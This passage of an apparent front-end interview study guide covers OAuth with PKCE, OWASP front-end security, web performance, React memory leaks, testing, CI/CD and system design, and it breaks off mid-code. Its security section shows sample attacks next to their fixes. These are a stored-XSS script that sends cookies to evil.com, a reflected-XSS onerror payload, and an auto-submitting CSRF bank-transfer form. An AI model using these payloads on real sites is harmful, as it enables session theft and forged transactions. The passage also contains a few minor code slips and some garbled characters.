     &scope=openid email profile
     &state=RANDOM_STRING  â† prevents CSRF
3. User authenticates and consents
4. Google redirects back to: https://yourapp.com/callback?code=AUTH_CODE&state=RANDOM_STRING
5. App server exchanges code for tokens (POST to token endpoint)
   â€” This happens server-side to keep client_secret private
6. Server stores access_token and refresh_token securely
7. App receives a session cookie (not the raw token)
```

##### Frontend: Initiating the flow

```tsx
// Login button component
function GoogleLogin() {
  function handleLogin() {
    const state = crypto.randomUUID(); // CSRF protection
    sessionStorage.setItem("oauth_state", state);

    const params = new URLSearchParams({
      client_id: "YOUR_CLIENT_ID",
      redirect_uri: "https://yourapp.com/callback",
      response_type: "code",
      scope: "openid email profile",
      state,
    });

    window.location.href = `https://accounts.google.com/o/oauth2/v2/auth?${params}`;
  }

  return <button onClick={handleLogin}>Log in with Google</button>;
}
```

##### Backend: Handling the callback (Node.js/Express example)

```ts
// GET /callback?code=...&state=...
app.get("/callback", async (req, res) => {
  const { code, state } = req.query;

  // 1. Validate state to prevent CSRF
  const savedState = req.session.oauth_state;
  if (!state || state !== savedState) {
    return res.status(400).send("Invalid state parameter");
  }

  // 2. Exchange code for tokens
  const tokenResponse = await fetch("https://oauth2.googleapis.com/token", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams({
      code: code as string,
      client_id: process.env.GOOGLE_CLIENT_ID!,
      client_secret: process.env.GOOGLE_CLIENT_SECRET!, // NEVER send to frontend
      redirect_uri: "https://yourapp.com/callback",
      grant_type: "authorization_code",
    }),
  });

  const tokens = await tokenResponse.json();
  // { access_token, refresh_token, expires_in, token_type, id_token }

  // 3. Fetch user info
  const userResponse = await fetch(
    "https://www.googleapis.com/oauth2/v2/userinfo",
    {
      headers: { Authorization: `Bearer ${tokens.access_token}` },
    },
  );
  const user = await userResponse.json();
  // { id, email, name, picture }

  // 4. Store tokens securely (database, encrypted)
  await db.saveUser({
    googleId: user.id,
    email: user.email,
    accessToken: tokens.access_token,
    refreshToken: tokens.refresh_token,
    expiresAt: Date.now() + tokens.expires_in * 1000,
  });

  // 5. Create session
  req.session.userId = user.id;

  // 6. Redirect to app
  res.redirect("/dashboard");
});
```

##### Refreshing expired tokens

```ts
async function refreshAccessToken(refreshToken: string) {
  const response = await fetch("https://oauth2.googleapis.com/token", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams({
      refresh_token: refreshToken,
      client_id: process.env.GOOGLE_CLIENT_ID!,
      client_secret: process.env.GOOGLE_CLIENT_SECRET!,
      grant_type: "refresh_token",
    }),
  });

  const tokens = await response.json();
  // { access_token, expires_in, token_type }
  // Note: No new refresh_token unless it was revoked

  return tokens.access_token;
}
```

#### Common pitfalls

| Mistake                              | Why it's bad                    | Correct approach                            |
| ------------------------------------ | ------------------------------- | ------------------------------------------- |
| Exposing `client_secret` in frontend | Anyone can impersonate your app | Keep it server-side only                    |
| Not validating `state` parameter     | Vulnerable to CSRF              | Generate random state, validate on callback |
| Storing tokens in `localStorage`     | XSS can steal them              | Use `httpOnly` cookies or encrypted DB      |
| Not handling token expiry            | API calls fail after ~1 hour    | Refresh tokens before they expire           |
| Using Implicit Flow for SPAs         | Deprecated, less secure         | Use Authorization Code + PKCE instead       |

#### PKCE (Proof Key for Code Exchange) â€” for SPAs

**Problem:** Single-page apps can't securely store a `client_secret`.  
**Solution:** PKCE uses a dynamically generated code verifier instead.

```tsx
// 1. Generate code verifier and challenge
function generatePKCE() {
  const verifier = base64UrlEncode(crypto.getRandomValues(new Uint8Array(32)));
  const challenge = base64UrlEncode(
    await crypto.subtle.digest("SHA-256", new TextEncoder().encode(verifier)),
  );
  return { verifier, challenge };
}

// 2. Store verifier, send challenge in auth request
const { verifier, challenge } = await generatePKCE();
sessionStorage.setItem("pkce_verifier", verifier);

const params = new URLSearchParams({
  client_id: "YOUR_CLIENT_ID",
  redirect_uri: "https://yourapp.com/callback",
  response_type: "code",
  scope: "openid email",
  code_challenge: challenge,
  code_challenge_method: "S256",
});
window.location.href = `https://provider.com/oauth/authorize?${params}`;

// 3. On callback, exchange code + verifier for tokens (no client_secret needed)
const verifier = sessionStorage.getItem("pkce_verifier");
const tokenResponse = await fetch("https://provider.com/oauth/token", {
  method: "POST",
  body: new URLSearchParams({
    code: code as string,
    client_id: "YOUR_CLIENT_ID",
    redirect_uri: "https://yourapp.com/callback",
    grant_type: "authorization_code",
    code_verifier: verifier!,
  }),
});
```

**Key interview points:**

- The `code` exchange happens **server-side** (or with PKCE for SPAs) â€” never expose `client_secret` to the browser.
- Access tokens are short-lived (minutes to hours); refresh tokens are long-lived.
- PKCE is now required for single-page apps per OAuth 2.1 spec.
- Always validate `state` parameter to prevent CSRF attacks.

### 4.4 Front-end security â€” OWASP

#### XSS (Cross-Site Scripting)

**Definition:** Attacker injects malicious script that executes in other users' browsers, stealing cookies, session tokens, or performing actions as the victim.

##### Attack scenario 1: Stored XSS (most dangerous)

```tsx
// VULNERABLE: Comment system that displays user input without escaping
function CommentList({
  comments,
}: {
  comments: Array<{ author: string; text: string }>;
}) {
  return (
    <ul>
      {comments.map((c, i) => (
        <li key={i}>
          <strong>{c.author}:</strong>
          {/* DANGER: User text rendered directly */}
          <div dangerouslySetInnerHTML={{ __html: c.text }} />
        </li>
      ))}
    </ul>
  );
}

// Attacker submits comment:
// "Check out my site! <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>"
//
// When other users view comments, the script executes in THEIR browser,
// sending their session cookie to evil.com.
```

**FIXED:**

```tsx
function CommentList({
  comments,
}: {
  comments: Array<{ author: string; text: string }>;
}) {
  return (
    <ul>
      {comments.map((c, i) => (
        <li key={i}>
          <strong>{c.author}:</strong>
          {/* SAFE: React auto-escapes by default */}
          <div>{c.text}</div>
        </li>
      ))}
    </ul>
  );
}

// If rich text is required, sanitize with DOMPurify:
import DOMPurify from "dompurify";

function RichComment({ html }: { html: string }) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ["b", "i", "em", "strong", "a"],
  });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

##### Attack scenario 2: Reflected XSS (URL-based)

```tsx
// VULNERABLE: Search page that echoes user query without escaping
function SearchResults() {
  const query = new URLSearchParams(window.location.search).get("q");

  return (
    <div>
      <h1>Results for: {query}</h1> {/* Safe in React */}
      {/* DANGER: If using vanilla JS or innerHTML */}
      <div dangerouslySetInnerHTML={{ __html: `Results for: ` + query }} />
    </div>
  );
}

// Attacker sends victim this link:
// https://yoursite.com/search?q=<img src=x onerror="alert(document.cookie)">
//
// When victim clicks, the script executes in the victim's browser.
```

**FIXED:**

```tsx
// React's JSX escapes by default â€” this is already safe:
<h1>Results for: {query}</h1>;

// For vanilla JS, manually escape:
function escapeHTML(str: string) {
  const div = document.createElement("div");
  div.textContent = str;
  return div.innerHTML;
}
```

##### XSS Mitigations (Defense in depth)

1. **Never use `dangerouslySetInnerHTML` with user input** â€” always sanitize with DOMPurify if needed
2. **Content-Security-Policy header** â€” blocks inline scripts, restricts script sources

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; object-src 'none'
```

3. **HttpOnly cookies** â€” prevents JS from reading session tokens

```http
Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict
```

4. **Escape user input** â€” React does this by default; vanilla JS requires manual escaping

#### CSRF (Cross-Site Request Forgery)

**Definition:** Attacker tricks a logged-in user's browser into making unintended authenticated requests.

##### Attack scenario: Malicious bank transfer

```html
<!-- Attacker's website: evil.com -->
<html>
  <body>
    <h1>Claim your free gift!</h1>
    <!-- Hidden form that auto-submits when page loads -->
    <form
      id="attack"
      action="https://bank.com/transfer"
      method="POST"
      style="display:none"
    >
      <input name="to" value="attacker-account" />
      <input name="amount" value="10000" />
    </form>
    <script>
      document.getElementById("attack").submit();
    </script>
  </body>
</html>

<!-- If victim is logged into bank.com and visits evil.com,
     the form submits with their session cookie attached automatically.
     Bank processes the transfer as if the user intended it. -->
```

##### CSRF Mitigations

**1. SameSite cookie attribute (modern browsers)**

```http
Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict
```

- `SameSite=Strict` â€” cookie never sent on cross-origin requests (safest)
- `SameSite=Lax` â€” cookie sent on top-level navigations (GET only), not on POST/PUT/DELETE

**2. CSRF tokens (required for older browser support)**

```tsx
// Backend: Generate token per session
app.post("/login", (req, res) => {
  req.session.csrfToken = crypto.randomBytes(32).toString("hex");
  res.cookie("csrf_token", req.session.csrfToken);
});

// Middleware: Validate token on state-changing requests
app.use("/api", (req, res, next) => {
  if (["POST", "PUT", "DELETE"].includes(req.method)) {
    const tokenFromHeader = req.headers["x-csrf-token"];
    if (tokenFromHeader !== req.session.csrfToken) {
      return res.status(403).send("CSRF token mismatch");
    }
  }
  next();
});

// Frontend: Send token with every mutating request
async function deleteUser(id: number) {
  const csrfToken = getCookie("csrf_token");
  await fetch(`/api/users/${id}`, {
    method: "DELETE",
    headers: { "X-CSRF-Token": csrfToken },
  });
}
```

**3. Check Origin/Referer headers (defense in depth)**

```ts
app.use((req, res, next) => {
  const origin = req.headers.origin || req.headers.referer;
  if (origin && !origin.startsWith("https://yourapp.com")) {
    return res.status(403).send("Invalid origin");
  }
  next();
});
```

**Real-world impact:**

- Without CSRF protection: Attacker can perform ANY action the logged-in user can (transfer money, change email, delete account)
- With `SameSite=Strict`: Attack blocked by browser automatically

#### Clickjacking

Attacker embeds your site in an invisible iframe to trick users into clicking.

**Mitigations:**

```http
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'
```

#### Secure cookie flags

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/
```

- `HttpOnly` â€” JS cannot read the cookie
- `Secure` â€” only sent over HTTPS
- `SameSite=Strict` â€” not sent on cross-origin requests at all

### 4.5 References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [jwt.io Introduction](https://jwt.io/introduction)
- [OAuth 2.0 Simplified](https://www.oauth.com) â€” Authorization Code chapter

---

## Phase 5 â€” Web Performance & Core Web Vitals

### 5.1 Core Web Vitals

| Metric                              | Measures                      | Good threshold |
| ----------------------------------- | ----------------------------- | -------------- |
| **LCP** (Largest Contentful Paint)  | Load time of the main content | < 2.5 s        |
| **INP** (Interaction to Next Paint) | Responsiveness to user input  | < 200 ms       |
| **CLS** (Cumulative Layout Shift)   | Visual stability              | < 0.1          |

#### What degrades LCP

- Large unoptimised images (add `loading="lazy"`, use WebP, set `width`/`height`)
- Render-blocking CSS or JS (`defer` scripts, inline critical CSS)
- Slow server response (caching, CDN)

#### What degrades CLS

- Images without explicit dimensions
- Fonts swapping after load (`font-display: swap` + preloading)
- Dynamic content injected above existing content

##### Optimization strategy 1: Image optimization

```html
<!-- BEFORE: Unoptimized (LCP: 4.2s, CLS: 0.35) -->
<img src="/images/hero.jpg" alt="Hero image" />

<!-- AFTER: Optimized (LCP: 1.8s, CLS: 0.02) -->
<img
  src="/images/hero-800w.webp"
  srcset="
    /images/hero-400w.webp   400w,
    /images/hero-800w.webp   800w,
    /images/hero-1200w.webp 1200w
  "
  sizes="(max-width: 768px) 100vw, 800px"
  alt="Hero image"
  width="800"
  height="600"
  loading="eager"
  fetchpriority="high"
/>

<!-- Benefits:
  - width/height prevent CLS (browser reserves space)
  - srcset serves appropriate size for device
  - WebP is 30-50% smaller than JPEG
  - fetchpriority="high" prioritizes LCP image
  - loading="eager" for above-fold, "lazy" for below-fold
-->
```

**Measurable improvement:** Converting a 500KB JPEG to WebP (150KB) + lazy loading saves 350KB and improves LCP by ~1.5s on 3G.

##### Optimization strategy 2: Critical CSS inlining

```html
<!-- BEFORE: Render-blocking CSS (FCP: 2.1s) -->
<link rel="stylesheet" href="/styles/main.css" />

<!-- AFTER: Inline critical CSS, defer non-critical (FCP: 0.8s) -->
<style>
  /* Critical: Above-the-fold styles only (~10-15KB max) */
  body {
    margin: 0;
    font-family: sans-serif;
  }
  .hero {
    min-height: 100vh;
    background: #000;
  }
  /* ... */
</style>

<link
  rel="preload"
  href="/styles/main.css"
  as="style"
  onload="this.onload=null;this.rel='stylesheet'"
/>
<noscript><link rel="stylesheet" href="/styles/main.css" /></noscript>

<!-- Tools to extract critical CSS: Critical, Critters, PurgeCSS -->
```

##### Optimization strategy 3: Font loading strategy

```css
/* BEFORE: Font swapping causes CLS */
@font-face {
  font-family: "MyFont";
  src: url("/fonts/myfont.woff2");
}

/* AFTER: Preload + font-display prevents CLS */
/* In HTML: */
```

```html
<link
  rel="preload"
  href="/fonts/myfont.woff2"
  as="font"
  type="font/woff2"
  crossorigin
/>
```

```css
@font-face {
  font-family: "MyFont";
  src: url("/fonts/myfont.woff2");
  font-display: swap; /* Shows fallback immediately, swaps when custom font loads */
}

/* Or use fallback font with similar metrics to avoid layout shift */
body {
  font-family:
    "MyFont",
    -apple-system,
    BlinkMacSystemFont,
    "Segoe UI",
    Arial,
    sans-serif;
}
```

**Measurable improvement:** Preloading fonts reduces CLS from 0.15 to 0.03.

### 5.2 Code splitting

```tsx
// React.lazy + Suspense â€” only loads Dashboard when route is accessed
const Dashboard = React.lazy(() => import("./Dashboard"));

function App() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <Dashboard />
    </Suspense>
  );
}
```

#### Advanced: Route-based + component-based splitting

```tsx
import { lazy, Suspense } from "react";
import { BrowserRouter, Routes, Route } from "react-router-dom";

// Route-level splitting â€” each route is a separate bundle
const Home = lazy(() => import("./pages/Home"));
const Dashboard = lazy(() => import("./pages/Dashboard"));
const Profile = lazy(() => import("./pages/Profile"));

// Component-level splitting â€” heavy components load on demand
const HeavyChart = lazy(() => import("./components/HeavyChart"));

function App() {
  return (
    <BrowserRouter>
      <Suspense fallback={<div>Loading...</div>}>
        <Routes>
          <Route path="/" element={<Home />} />
          <Route path="/dashboard" element={<Dashboard />} />
          <Route path="/profile" element={<Profile />} />
        </Routes>
      </Suspense>
    </BrowserRouter>
  );
}

// Usage in a page
function Dashboard() {
  const [showChart, setShowChart] = useState(false);

  return (
    <div>
      <h1>Dashboard</h1>
      <button onClick={() => setShowChart(true)}>Show Chart</button>
      {showChart && (
        <Suspense fallback={<div>Loading chart...</div>}>
          <HeavyChart />
        </Suspense>
      )}
    </div>
  );
}
```

**Measurable improvement:** Main bundle reduced from 500KB to 150KB. Dashboard route loads its own 100KB chunk only when visited.

### 5.3 Caching headers

```http
# Static assets â€” cache aggressively, filename includes content hash
Cache-Control: public, max-age=31536000, immutable

# HTML â€” always revalidate
Cache-Control: no-cache
ETag: "abc123"
```

#### Caching strategy comparison

| Resource type                       | Cache-Control                              | Why                                                         |
| ----------------------------------- | ------------------------------------------ | ----------------------------------------------------------- |
| JS/CSS with hash (`main.a1b2c3.js`) | `public, max-age=31536000, immutable`      | Hash changes when content changes â€” safe to cache forever |
| Images, fonts                       | `public, max-age=2592000` (30 days)        | Rarely change, but no hash in filename                      |
| HTML                                | `no-cache` or `max-age=0, must-revalidate` | Always check server for updates                             |
| API responses (user data)           | `no-store`                                 | Never cache sensitive data                                  |
| API responses (public data)         | `public, max-age=300` (5 min)              | Cache briefly to reduce server load                         |

```ts
// Backend: Set cache headers (Express example)
app.use(
  "/static",
  express.static("public", {
    maxAge: "1y", // 1 year for static assets
    immutable: true,
  }),
);

app.get("/api/products", (req, res) => {
  res.set("Cache-Control", "public, max-age=300"); // 5 minutes
  res.json(products);
});

app.get("/api/user/profile", (req, res) => {
  res.set("Cache-Control", "no-store"); // Never cache
  res.json(userProfile);
});
```

**Measurable improvement:** Proper caching reduces repeat visit load time by 60-80% (no JS/CSS re-downloads).

### 5.4 Memory leaks in React

Memory leaks cause increasing memory usage over time, leading to slow performance or crashes.

#### Leak 1: Uncleared intervals/timeouts

```tsx
// LEAK â€” setInterval keeps running after component unmounts
function BadTimer() {
  useEffect(() => {
    const id = setInterval(() => console.log("tick"), 1000);
    // forgot return! Interval runs forever even after component is gone
  }, []);

  return <div>Timer</div>;
}

// FIXED
function GoodTimer() {
  useEffect(() => {
    const id = setInterval(() => console.log("tick"), 1000);
    return () => clearInterval(id); // cleanup on unmount
  }, []);

  return <div>Timer</div>;
}
```

#### Leak 2: Event listeners not removed

```tsx
// LEAK
function BadResizeHandler() {
  useEffect(() => {
    const handleResize = () => console.log(window.innerWidth);
    window.addEventListener("resize", handleResize);
    // forgot to remove! Listener stays forever
  }, []);

  return <div>Resize handler</div>;
}

// FIXED
function GoodResizeHandler() {
  useEffect(() => {
    const handleResize = () => console.log(window.innerWidth);
    window.addEventListener("resize", handleResize);
    return () => window.removeEventListener("resize", handleResize);
  }, []);

  return <div>Resize handler</div>;
}
```

#### Leak 3: Stale closures in event handlers

```tsx
// LEAK â€” closure captures old state value
function BadCounter() {
  const [count, setCount] = useState(0);

  useEffect(() => {
    const id = setInterval(() => {
      setCount(count + 1); // Always adds to the initial count (0)
    }, 1000);
    return () => clearInterval(id);
  }, []); // Empty deps â€” count is stale

  return <div>{count}</div>; // Stuck at 1
}

// FIXED â€” use functional update
function GoodCounter() {
  const [count, setCount] = useState(0);

  useEffect(() => {
    const id = setInterval(() => {
      setCount((prev) => prev + 1); // Reads latest value
    }, 1000);
    return () => clearInterval(id);
  }, []);

  return <div>{count}</div>; // Counts correctly
}
```

#### Leak 4: Fetch requests not cancelled

```tsx
// LEAK â€” fetch completes after unmount, tries to update state
function BadUserProfile({ userId }: { userId: number }) {
  const [user, setUser] = useState(null);

  useEffect(() => {
    fetch(`/api/users/${userId}`)
      .then((r) => r.json())
      .then(setUser); // ERROR if component unmounted
  }, [userId]);

  return <div>{user?.name}</div>;
}

// FIXED â€” abort controller
function GoodUserProfile({ userId }: { userId: number }) {
  const [user, setUser] = useState(null);

  useEffect(() => {
    const controller = new AbortController();

    fetch(`/api/users/${userId}`, { signal: controller.signal })
      .then((r) => r.json())
      .then(setUser)
      .catch((err) => {
        if (err.name !== "AbortError") console.error(err);
      });

    return () => controller.abort(); // cancels request on unmount
  }, [userId]);

  return <div>{user?.name}</div>;
}
```

**Detection:** Open Chrome DevTools â†’ Memory â†’ Take heap snapshot before and after navigating. Look for Detached DOM nodes or increasing Listener counts.

### 5.5 Performance checklist (before shipping)

- [ ] All images have `width` and `height` attributes
- [ ] Critical images use `fetchpriority="high"`
- [ ] Below-fold images use `loading="lazy"`
- [ ] Fonts are preloaded with `<link rel="preload" as="font">`
- [ ] CSS uses `font-display: swap`
- [ ] JavaScript bundles are code-split by route
- [ ] Static assets have cache headers with 1-year max-age
- [ ] No memory leaks (all `useEffect` cleanups return cleanup functions)
- [ ] API responses are compressed (gzip/brotli)
- [ ] Core Web Vitals: LCP < 2.5s, INP < 200ms, CLS < 0.1

### 5.6 References

- [web.dev/vitals](https://web.dev/vitals/)
- [web.dev/learn/performance](https://web.dev/learn/performance/)

---

## Phase 6 â€” Testing

### 6.1 Jest â€” unit testing

```ts
// sum.ts
export function sum(a: number, b: number) {
  return a + b;
}

// sum.test.ts
import { sum } from "./sum";

describe("sum", () => {
  it("adds two positive numbers", () => {
    expect(sum(2, 3)).toBe(5);
  });

  it("handles negative numbers", () => {
    expect(sum(-1, 1)).toBe(0);
  });
});
```

#### Mocking

```ts
// Mock a module
jest.mock("./api", () => ({
  fetchUser: jest.fn().mockResolvedValue({ id: 1, name: "Alice" }),
}));

// Mock a function
const mockFn = jest.fn();
mockFn.mockReturnValue(42);
expect(mockFn).toHaveBeenCalledWith("arg");
expect(mockFn).toHaveBeenCalledTimes(1);
```

### 6.2 React Testing Library â€” component testing

```tsx
import { render, screen, fireEvent, waitFor } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import LoginForm from "./LoginForm";

describe("LoginForm", () => {
  it("shows validation error for invalid email", async () => {
    render(<LoginForm />);

    await userEvent.type(screen.getByLabelText(/email/i), "notanemail");
    await userEvent.click(screen.getByRole("button", { name: /log in/i }));

    expect(screen.getByRole("alert")).toHaveTextContent(/valid email/i);
  });

  it("calls onSubmit with form data", async () => {
    const onSubmit = jest.fn();
    render(<LoginForm onSubmit={onSubmit} />);

    await userEvent.type(screen.getByLabelText(/email/i), "alice@example.com");
    await userEvent.type(screen.getByLabelText(/password/i), "password123");
    await userEvent.click(screen.getByRole("button", { name: /log in/i }));

    await waitFor(() => {
      expect(onSubmit).toHaveBeenCalledWith({
        email: "alice@example.com",
        password: "password123",
      });
    });
  });
});
```

**Key RTL philosophy:** Query by what the user sees, not implementation details.

- Prefer `getByRole`, `getByLabelText`, `getByText` over `getByTestId`
- Test behavior, not internals (don't test state variables directly)

### 6.3 References

- [React Testing Library docs](https://testing-library.com/docs/react-testing-library/intro/)
- [jestjs.io/docs/getting-started](https://jestjs.io/docs/getting-started)

---

## Phase 7 â€” CI/CD & Git (Conceptual)

### 7.1 Git workflows

```bash
# Feature branch workflow
git checkout -b feature/user-auth
git add .
git commit -m "feat: add JWT authentication flow"
git push origin feature/user-auth
# Open PR, code review, merge to main

# Rebase to keep history clean before merging
git fetch origin
git rebase origin/main
```

#### Merge vs rebase

- **Merge** â€” preserves full history, adds a merge commit. Easier to understand for teams.
- **Rebase** â€” rewrites history to be linear. Cleaner log but rewrites commits (never rebase shared branches).

### 7.2 CI/CD pipeline stages

```yaml
# Typical pipeline order (don't skip steps)
stages:
  - install # npm ci
  - lint # eslint, stylelint
  - typecheck # tsc --noEmit
  - test # jest --ci --coverage
  - build # npm run build
  - deploy # push to staging/production
```

**Key points:**

- `npm ci` (not `npm install`) in CI â€” uses exact lockfile versions, fails if lock is out of sync
- Environment variables injected by the CI system, never committed to repo
- `.env.local` for local dev, `.env.production` for build-time values

### 7.3 Rollback strategies

| Strategy              | How                                 | When                                 |
| --------------------- | ----------------------------------- | ------------------------------------ |
| **Redeploy previous** | Re-run previous pipeline            | Fastest for most cases               |
| **Feature flags**     | Toggle off the bad feature          | Zero downtime, no redeploy           |
| **Blue/green**        | Route traffic to stable environment | Large-scale, high-availability needs |
| **Canary**            | Gradually shift traffic             | Progressive rollout safety           |

---

## Phase 8 â€” Frontend System Design for IC Interviews

**Why this matters:** Physical interviews for senior IC roles test your ability to architect solutions, make trade-offs, and communicate technical decisions â€” not just write algorithms.

---

### 8.1 Whiteboard Coding Tips

**The challenge:** No autocomplete, no syntax checker, no ability to run the code. Your interviewer is evaluating thought process more than perfect syntax.

#### Before you write a single line

1. **Restate the problem** in your own words â€” "So you want me to build a search autocomplete that fetches from an API and handles keyboard navigation, correct?"
2. **Clarify scope** â€” "Should I handle edge cases like network failures and empty results?" (Always ask, don't assume)
3. **Discuss approach first** â€” "I'm thinking of using a debounced effect to avoid spamming the API. Does that sound reasonable?"
4. **Ask about constraints** â€” "Can I use any library, or vanilla JS only?" "What level of TypeScript strictness?"

#### While coding on the whiteboard

- **Narrate constantly** â€” "I'm creating a ref here to track the abort controller so we can cancel in-flight requests..."
- **Write function signatures first** â€” types, parameters, return value. Fill in the body after.
- **Use comments as scaffolding** â€” write `// fetch results`, `// handle keyboard`, then implement each
- **Syntax shortcuts interviewers accept:**
  - Arrow functions without explicit `return` for one-liners: `const double = x => x * 2`
  - Omitting semicolons (pick one style and be consistent)
  - Pseudo-imports: "assume I've imported `debounce` from lodash"
  - Inline types: `data: Array<SearchResult>` instead of defining a separate interface if it's obvious
- **Leave space** â€” write on every other line so you can insert missed logic without squeezing

#### If you get stuck

- **Talk through it** â€” "I know I need to prevent race conditions here... I think I can use an abort controller, let me sketch that out"
- **Ask for hints** â€” "I'm blanking on the exact API for Intersection Observer â€” can I assume it exists and move on?"
- **Simplify first, optimize later** â€” "Let me get the basic version working, then we can discuss caching"

#### What NOT to do

- âŒ Go silent for 2+ minutes while writing
- âŒ Erase and restart from scratch (iterative refinement is fine, total rewrites signal poor planning)
- âŒ Say "I don't know" and stop â€” say "I don't know X, but here's how I'd approach it..."
- âŒ Ignore edge cases completely â€” at least acknowledge them ("I should validate input here but skipping for brevity")

---

### 8.2 System Design Framework (5-Step Template)

Use this template for **any** "design X" question.

#### Step 1: Clarify Requirements (2â€“3 minutes)

Ask these questions **before** writing code:

**Functional requirements:**

- What is the primary user action? (search, scroll, submit, etc.)
- What data is displayed? Where does it come from (API, local state, props)?
- What are the success and error states?
- Any special interactions? (keyboard nav, drag-and-drop, real-time updates)

**Non-functional requirements:**

- Scale: 10 items or 10,000? Does virtualization matter?
- Performance: Any latency budgets? (e.g., search results in <300ms)
- Accessibility: Keyboard-only users? Screen readers?
- Browser support: Modern evergreen or legacy IE11?

**Example exchange:**

> Interviewer: "Design an infinite scroll feed."  
> You: "Got it. A few clarifying questions: How many items per page? Do we paginate with offset or cursor-based? Should I handle optimistic updates if the user likes a post? Any special requirements for accessibility or SEO?"

#### Step 2: Sketch Component Tree (3â€“5 minutes)

Draw the component hierarchy on the whiteboard. Use ASCII art in your notes:

```
App
â”œâ”€â”€ Header
â”œâ”€â”€ FeedContainer
â”‚   â”œâ”€â”€ FeedItem (repeated)
â”‚   â”œâ”€â”€ LoadingSpinner
â”‚   â””â”€â”€ ErrorBoundary
â””â”€â”€ Footer
```

**Key decisions at this stage:**

- Where does state live? (local, lifted, context, global store)
- What are the component boundaries? (when to split into smaller components)
- How does data flow? (props down, events up)

#### Step 3: Define State & Data Flow (5 minutes)

List out:

- **UI state** â€” loading, error, empty, success
- **Domain data** â€” the actual content (posts, users, products)
- **Form state** (if applicable) â€” input values, validation errors, touched fields
- **Derived state** â€” anything computed from other state (don't store in state if you can compute it)

**Example for autocomplete:**

```typescript
// State structure
type SearchState = {
  query: string; // controlled input value
  results: Array<SearchResult>; // fetched data
  loading: boolean;
  error: Error | null;
  selectedIndex: number; // for keyboard nav
};
```

**Data flow:**

1. User types â†’ `query` updates â†’ debounced effect triggers
2. Effect calls API â†’ `loading` = true
3. API returns â†’ `results` populated, `loading` = false
4. User presses â†“ â†’ `selectedIndex` increments

#### Step 4: Identify Performance & Accessibility Concerns (3 minutes)

**Performance checklist:**

- [ ] Debounce/throttle frequent events (input, scroll, resize)
- [ ] Memoize expensive computations (`useMemo`)
- [ ] Memoize callbacks passed to children (`useCallback`)
- [ ] Virtualize long lists (>100 items)
- [ ] Code-split heavy components (`React.lazy`)
- [ ] Cancel in-flight requests on unmount (`AbortController`)

**Accessibility checklist:**

- [ ] Semantic HTML (`<button>` not `<div onClick>`)
- [ ] Keyboard navigation (Tab, Enter, Esc, arrow keys)
- [ ] ARIA roles and labels (`role="listbox"`, `aria-label`)
- [ ] Focus management (trap focus in modals, restore focus after close)
- [ ] Screen reader announcements (`aria-live` regions)

#### Step 5: Discuss Testing & Edge Cases (2 minutes)

**Testing strategy:**

- Unit tests: Pure functions (validation, formatters, utils)
- Integration tests: Component with mocked API (React Testing Library)
- E2E tests: Full user flow (Cypress, Playwright)

**Edge cases to mention:**

- Empty states (no results, no data)
- Error states (network failure, 500 error, timeout)
- Loading states (skeleton vs spinner)
- Race conditions (user types "a", then "ab" before first request finishes)
- Null/undefined data (defensive checks)
- Extremely long strings (truncate, ellipsis)

---

### 8.3 Five Worked Examples

#### Example 1: Autocomplete Search with Debouncing

**Problem Statement:**  
Design an autocomplete input that fetches search suggestions from an API as the user types. Support keyboard navigation (â†‘â†“ arrows, Enter to select, Esc to close). Make it accessible.

**Requirements Clarification:**

> You: "How many results should I display? Is there a max?"  
> Interviewer: "Show up to 10 results."
>
> You: "Should I debounce the API calls? What delay?"  
> Interviewer: "Yes, 300ms is fine."
>
> You: "Any caching? If the user types 'react', then deletes to 'reac', should I refetch or use cached results?"  
> Interviewer: "Caching would be nice but not required for the MVP."

**Component Tree:**

```
AutocompleteSearch
â”œâ”€â”€ SearchInput (controlled)
â”œâ”€â”€ SuggestionsList
â”‚   â””â”€â”€ SuggestionItem (repeated)
â””â”€â”€ AriaLiveRegion (for screen readers)
```

**State Structure:**

```typescript
type Suggestion = {
  id: string;
  label: string;
  url?: string;
};

type AutocompleteState = {
  query: string;
  suggestions: Suggestion[];
  loading: boolean;
  error: Error | null;
  selectedIndex: number; // -1 = none selected
  isOpen: boolean;
};
```

**Code Skeleton:**

```tsx
import { useState, useEffect, useRef } from "react";

function AutocompleteSearch() {
  const [query, setQuery] = useState("");
  const [suggestions, setSuggestions] = useState<Suggestion[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<Error | null>(null);
  const [selectedIndex, setSelectedIndex] = useState(-1);
  const [isOpen, setIsOpen] = useState(false);

  const abortControllerRef = useRef<AbortController | null>(null);

  // Debounced fetch effect
  useEffect(() => {
    if (!query.trim()) {
      setSuggestions([]);
      setIsOpen(false);
      return;
    }

    // Cancel previous request
    if (abortControllerRef.current) {
      abortControllerRef.current.abort();
    }

    const controller = new AbortController();
    abortControllerRef.current = controller;

    const timer = setTimeout(async () => {
      setLoading(true);
      setError(null);

      try {
        const res = await fetch(`/api/search?q=${encodeURIComponent(query)}`, {
          signal: controller.signal,
        });
        if (!res.ok) throw new Error("Search failed");
        const data = await res.json();
        setSuggestions(data.results.slice(0, 10));
        setIsOpen(true);
      } catch (err: any) {
        if (err.name !== "AbortError") {
          setError(err);
        }
      } finally {
        setLoading(false);
      }
    }, 300); // debounce delay

    return () => {
      clearTimeout(timer);
      controller.abort();
    };
  }, [query]);

  // Keyboard navigation
  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (!isOpen) return;

    switch (e.key) {
      case "ArrowDown":
        e.preventDefault();
        setSelectedIndex((prev) => Math.min(prev + 1, suggestions.length - 1));
        break;
      case "ArrowUp":
        e.preventDefault();
        setSelectedIndex((prev) => Math.max(prev - 1, -1));
        break;
      case "Enter":
        if (selectedIndex >= 0) {
          e.preventDefault();
          // Navigate to selected suggestion
          window.location.href = suggestions[selectedIndex].url || "#";
        }
        break;
      case "Escape":
